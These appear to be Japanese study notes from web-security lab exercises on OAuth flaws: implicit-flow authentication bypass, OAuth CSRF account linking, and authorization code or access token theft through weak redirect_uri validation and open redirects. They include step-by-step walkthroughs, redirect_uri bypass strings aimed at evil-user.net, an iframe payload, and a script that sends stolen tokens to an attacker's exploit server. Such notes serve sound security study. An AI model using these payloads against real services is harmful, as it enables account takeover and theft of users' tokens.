# クライアントアプリ上の脆弱性

- OAuthサービスがとても堅牢でも、クライアントアプリケーションの実装がセキュアでないとき

## Implicitフローの不適切な実装

###### implicitフローの仕様

- ログイン後、ユーザがページを閉じた後もクライアント側でアクセストークン等をどこかに保存する必要がある
- そのために、セッションCookieを使用する
	- POSTリクエストでアクセストークン等の情報をサーバに送信し、ユーザにセッションcookieを割り当てる
	- ユーザは次回、セッションCookieを使用してログインできる
	- 通常のパスワードベースのログインと「ほぼ」同じ

###### implicitフローの問題点

- サーバは送信されたデータが正しいか照会するための秘密鍵やパスワードを持ってない。そのため、値を暗黙的に信頼してしまう。
	- 通常のパスワードベースのログインなら、サーバはハッシュ化されたパスワード等と比較して、リクエストが正しいか検証する。

- このとき、もしクライアントアプリケーション側でアクセストークンが他のリクエストと一致するか検証しない場合、攻撃者は任意のパラメータに変更するだけで被害者のアカウントを侵害できる

#### 脆弱なOAuth認証バイパス(滅多にない単純なケース)

1. `/userinfo`エンドポイントからのリソースを含むPOSTリクエスト
```http
POST /authenticate HTTP/1.1
...
{
	"email":"carlos@carlos-montoya.net",
	"username":"carlos",
	"token":"k2MY5UicpP5H4R9XBHhYjlegj_p00LK7Lh4XsgSjM9g"
}
```
2. `email`と`username`を被害者ユーザのものに変えてリクエスト。エラーがないことを確認
3. 該当リクエストを右クリック-> "Request in browser" -> "In original session"でコピーしたURLをブラウザで表示する

## CSRF対策の欠陥

###### 悪用可能なシチュエーション

- `state`パラメタがない場合(`state`パラメタ≒CSRFトークン)
- 通常のパスワードでログインする機能と、OAuthを使用して自身のSNSのアカウントとリンクすることでログインする機能がある場合

###### 攻撃概要

- 被害者のアカウントを攻撃者のアカウントと結びつけ、被害者はそれに気づかず機密情報をアップロードする
	- 被害者は攻撃者のアカウントでログインしているが、それに気づいていないようなもの

- 結果、攻撃者はアップロードされた機密情報を閲覧できる

1. 攻撃者はOAuthサービスからの認可コードのリダイレクトを中断させる
2. 被害者に攻撃者の認可コードを含むURLを送信し、クリックさせる
3. 攻撃者のアクセストークンが被害者のセッションと結びつく
![[Pasted image 20240131194008.png | 300]]

#### OAuth CSRFによるアカウント乗っ取りステップ

###### やり方だけの雑だが簡単な方法

1. SNSでログインする
2. ログアウトする
3. 通常のパスワードでログインする
4. ProxyのInterceptをクリックして"Attache a social profile"をクリックする
5. リクエストをメモし、本来のリクエストはDropする
6. そのリクエストでCSRF PoCを作成し、被害者にDeliver
    被害者は常にログインしている状態なので、被害者のblogアカウントと攻撃者のSNSアカウントが結びつく

###### 機能の探索

1. パスワードでログインする
2. "Attache a social profile"等の文言の「SNSと連携する機能」を実行すると、認可画面が表示され、OAuthフローが始まることを確認する
3. "Log in with social media"等の文言の「SNSアカウントでログインする機能」を実行すると、直にアカウントページに移行することを確認する

###### 被害者のアカウントと攻撃者のSNSアカウントを結びつける

4. SNSと連携する機能を実行するとき、`GET /example?client_id...`のようなリクエストパラメタに、`redirect_uri`を確認する。これは指定したエンドポイントへ認可コードを送っていることを表す
5. また、==`state`パラメタ==が付与されていないことからCSRF脆弱性を確信する
6. ProxyのInterceptをOnにして、"Attache a social profile"(SNSと連携する機能）をクリックする
7. ステップ4で確認したエンドポイントへのリクエストをメモ。本来のリクエストはDropする
	- わざと認可コードのリダイレクトを中断させる

8. [1. CSRFの基本と対策](../../Client-side/CSRF/1.%20CSRFの基本と対策.md#⭐️Generate%20CSRF%20PoC(pro))でペイロードを作成し、被害者にDeliver
- 被害者のアカウントと攻撃者のSNSアカウントが結びつく

# OAuthサービス上の脆弱性

## 認可コード横取り攻撃(アクセストークンも可)

##### 基本概念
###### 悪用可能なシチュエーション

- OAuthサービス側で、`redirect_uri`の値を検証できないとき
- `state`や`nonce`パラメタがあっても悪用可能
	- 攻撃者自身のブラウザでパラメタの値を生成すればいいだけなので

###### 悪用が不可能なケース

- 認可サーバがクライアントからの①Authorization requestで指定された`redirect_uri`の値を④Access token request時に検証する場合は無理
- 被害者がOAuthフローを開始するとクライアントから正規の`/callback`エンドポイントが指定される
```
...redirect_uri=https://example.com/callback
```
- 攻撃者はCSRF等で`redirect_uri`の値を自身の管理するエンドポイントに指定する
```
...redirect_uri=https://example.com/attacker-callback
```
- アクセストークン要求時にも`redirect_uri`を付与する
```
...redirect_uri=https://example.com/attacker-callback
```
- 認可サーバは本来の`/callback`と異なることに気づく

###### 前提知識

- 認可コードもしくはアクセストークン(Grant typeによって異なる)が、①認可要求(Authorization request)の`redirect_uri`パラメタで指定したクライアントのエンドポイント(`/callback`)に、被害者のブラウザを経由して送られる(③Authorization code grant)
![[Pasted image 20240201093116.png | 300]]

###### 攻撃概要

- CSRF攻撃等で被害者を騙して被害者のブラウザから攻撃者が管理するエンドポイントを`redirect_uri`に指定したOAuthフローを開始させ、認可コードもしくはアクセストークンを入手する。
- Authorization code grantタイプの場合、被害者の認可コードが使用(アクセストークンと交換)される前に盗む事が出来る
- 攻撃者は入手した認可コードを被害者の正規のクライアントエンドポイント(`callback`)に送ることで、アクセストークンの発行などを経て、アカウントを侵害する

#### 認可コード横取り攻撃ステップ(redirect_uri検証無)

###### 認可コードが横取り可能かの確認

1. OAuthフローを探索していく中で、`redirect_uri`などの認可コードのリダイレクト先を指定するパラメタを探す
	- `response_type=code`の場合はAuthorization codeフロー。
	- `code`パラメタは認可コードを値にもつ

2. Interceptをonにして、OAuthフローを傍受。`redirect_uri`パラメタをエクスプロイトサーバへ変更する
```
redirect_uri=https://EXPLOIT_DOMAIN
```

3. エクスプロイトサーバのlogを確認し、攻撃者自身の`code`(認可コード)が送られていることを確認する
	- 認可コードの流出が可能だとわかる

###### 被害者の認可コードを横取りする

4. `redirect_uri`をエクスプロイトサーバに指定したOAuthフロー開始リクエストURLを、no user interactionで被害者に送らせるペイロードを作成する。(codeは未使用である必要があるのでinterceptionを使用する)
```http
<iframe src="https://[oauth-hostname]/auth?client_id=..."></iframe>
```
- ↓該当リクエストの見た目
```http
GET /auth?client_id=hu49yojcbed6r072co0iw&redirect_uri=https://exploit-0a3400e4048409a182addc31010f00e8.exploit-server.net&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0a64005c0467098c829adbf702f1005e.oauth-server.net
```

5. 被害者にペイロードをDeliverし、ログを確認して`code`(認可コード)を入手する
6. 正当なエンドポイント(`/oauth-callback?code=..`等)のcodeを被害者の認可コードに書き換えて==ブラウザから==リクエストをする
	- アクセストークンを入手＝被害者のアカウント乗っ取り完了

#### redirect_uri検証のバイパステクニック

- 以下のテクニックを使用することで、redirect_uriパラメタの検証をバイパス出来る可能性がある

###### 正当なドメインをサブドメインにする

```http
...&redirect_uri=https://default-host.evil-user.net
```
- 参考：[2.  一般的なSSRF防御の回避](../../Server-side/SSRF/2.%20%20一般的なSSRF防御の回避.md#SSRF%20ホワイトリスト回避)

###### 値を追加して検証をバイパスする

```http
...&redirect_uri=https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```
- 参考：[2.  一般的なSSRF防御の回避](../../Server-side/SSRF/2.%20%20一般的なSSRF防御の回避.md#SSRF%20ホワイトリスト回避)

###### 同じパラメタ、値で正規の値を上書きする

```http
...&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```
- 参考：[2. クエリとして内部APIへ送信するストリングのテスト](../../Server-side/API%20testing/4.%20Server-sideパラメタ汚染/2.%20クエリとして内部APIへ送信するストリングのテスト.md#既に存在するパラメタの上書き)

###### localhostをサブドメインに指定する

```http
...&redirect_uri=localhost.evil-user.net
```
- `localhost`は特別扱いされるかも

##### `response_mode`と組み合わせて検証する

- `response_mode=query` -> `response_mode=fragment`に変更する
	- これにより、ブロックされていたURIが`redirect_uri`に指定できるようになる可能性

- `response_mode=web_message`
	- これにより、サブドメインとして使える文字が増えるようになる

###### response_modeの種類

- `query`：レスポンスがURLのクエリ文字列を通じて転送される。例：`https://client.example.com/cb?code=AUTH_CODE_HERE`
- `fragment`：レスポンスがURLフラグメントを通じて転送される。これはブラウザ側でのみアクセス可能で、フラグメントはブラウザによって解析されるが、サーバには送信されない。例：`https://client.example.com/cb#code=AUTH_CODE_HERE`。
- `form_post`：レスポンスがHTMLフォームを通じてPOSTリクエストとして転送される。HTTPリクエストボディ内に含まれる
- `web_message`：レスポンスがHTML5のWeb Messagingを使用して転送される。

### Open redirectを使用した窃取(redirect_uri検証有)

- `redirect_uri`を素直に変更できない場合
- 詳細: [Stealing codes and access tokens via a proxy page](https://portswigger.net/web-security/oauth#oauth-authentication:~:text=Stealing%20codes%20and%20access%20tokens%20via%20a%20proxy%20page)

###### 攻撃概要

- [2. OAuth認証の悪用](2.%20OAuth認証の悪用.md#redirect_uri検証のバイパステクニック)や、[Path traversal](../../Server-side/Path%20traversal/Path%20traversal.md)の技術を使って検証をバイパスして指定できるページを見つける
```
https://client-app.com/oauth/callback/../../example/path
```
	↓
```
https://client-app.com/example/path
```

- Authorization code flow(`response_type=code`)の場合: クエリパラメタに認可コードがある(`/callback?code=...`)
- Implicit grant type(`response_type=token`)の場合: URLフラグメントにアクセストークンがある。(`/callback#access_token=...`)
	- `#`以降の値はプロキシで確認はできないが、APIコールで`token`などの値をJSON形式で送っている

- - > Open redirect脆弱性を使用して認可コード / アクセストークンを抽出する([2.  一般的なSSRF防御の回避](../../Server-side/SSRF/2.%20%20一般的なSSRF防御の回避.md#Open%20redirect%20URLの基本))

- つまり以下のような手順になる

1. リダイレクト先の操作: `redirect_uri`の検証をバイパスするために、ディレクトリトラバーサルやその他のテクニックを使用して、指定可能なページを見つける
2. 攻撃者が管理するエンドポイント上でクエリ、もしくはフラグメントから認可コード / アクセストークンを抽出するスクリプトをあらかじめホストしておく
3. Open redirect脆弱性の利用: `redirect_uri`で指定可能な==ページ上==でOpen redirectを使用して、攻撃者が管理するエンドポイントへリダイレクトさせる
	- つまり、`redirect_uri`で指定したページ -> open redirect発生 -> 攻撃者のエンドポイントへ遷移

###### Implicit grant typeの場合の注意点

- アクセストークンを窃取しただけでは被害者のアカウントを窃取できない
- 窃取したアクセストークンを使用して、リソースサーバへリソースの取得をリクエストする必要がある
```http
{
	"email":"wiener@hotdog.com",
	"username":"wiener",
	"token":"iZI3vbJGS-bMEE6_c-4j64UgStkgLvxI_T3Oismwyt8"
}
```

#### アクセストークン横取り攻撃ステップ(redirect_uri検証有)

###### 1. Grant typeを判断し、目的は認可コード/アクセストークンなのか確認する

- `response_type: code` -> Authorization grant type。クエリパラメタに認可コードが付与される
- `response_type: token` -> Implicit。フラグメント識別子(`#`)以降にアクセストークンを付与している

###### 2. Open redirect脆弱性を発見する

- エンドポイントを探索し、Open redirect脆弱性を発見する。([2.  一般的なSSRF防御の回避](../../Server-side/SSRF/2.%20%20一般的なSSRF防御の回避.md#バイパスできる条件))

###### 3. redirect_uriの検証をバイパスしてopen redirect脆弱性が使用できるか確認する

- 例えば、open redirect脆弱性が以下のようだとする
```http
GET /post?path=https://google.com HTTP/1.1
```

- OAuth開始リクエストの`redirect_uri`に、[Path traversal](../../Server-side/Path%20traversal/Path%20traversal.md)や[2. OAuth認証の悪用](2.%20OAuth認証の悪用.md#redirect_uri検証のバイパステクニック)を使用してopen redirect脆弱性を指定する
```http
GET /auth?clint_id...&redirect_uri=https://TARGET_NET/oauth-callback/../post?path=https://google.com&response_type=token...
```
- ==⚠️== `nonce`パラメタが含まれている場合、Repeaterで同じnonceを使用するとエラーになるので、ProxyのInterceptでリクエストを傍受してnonceが未使用の状態で`redirect_uri`を変更してForwardする

###### 4. 攻撃者のサーバに認可コード / アクセストークン抽出のスクリプトを用意する

- Authorization code grant -> [2. OAuth認証の悪用](2.%20OAuth認証の悪用.md#被害者の認可コードを横取りする)と同じで`<iframe>`

- implicit↓
1. スクリプトを作成してdeliver
```js
<script>
    if (!document.location.hash) {
        window.location = 'https://[oauth-hostname]/auth?client_id=[clientID]&redirect_uri=https://[TARGET_NET]/oauth-callback/../post/next?path=[攻撃者のサーバでホストするexploitファイルへの絶対URL]&response_type=token&nonce=[nonce]&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
- ==⚠️==: `nonce`はinterceptし未使用の値を指定すること
- フラグメント識別子以降の値は非表示なので、クエリパラメタに付与するスクリプト

2. 攻撃者のサーバのアクセスログからアクセストークンを入手する

###### 5. 目的を実行する

- Authorization code grant -> codeを正規のエンドポイントへ指定するとアカウント侵害[2. OAuth認証の悪用](2.%20OAuth認証の悪用.md#被害者の認可コードを横取りする)

- Implicit -> 窃取したアクセストークンを使用してAPI callする
	- API callするリクエストに、`Authorization: Bearer [access_token]`というヘッダと値がある
	- HTTP HistoryのFilterで"Bearer"を検索
	- 入手したアクセストークンで上書きする
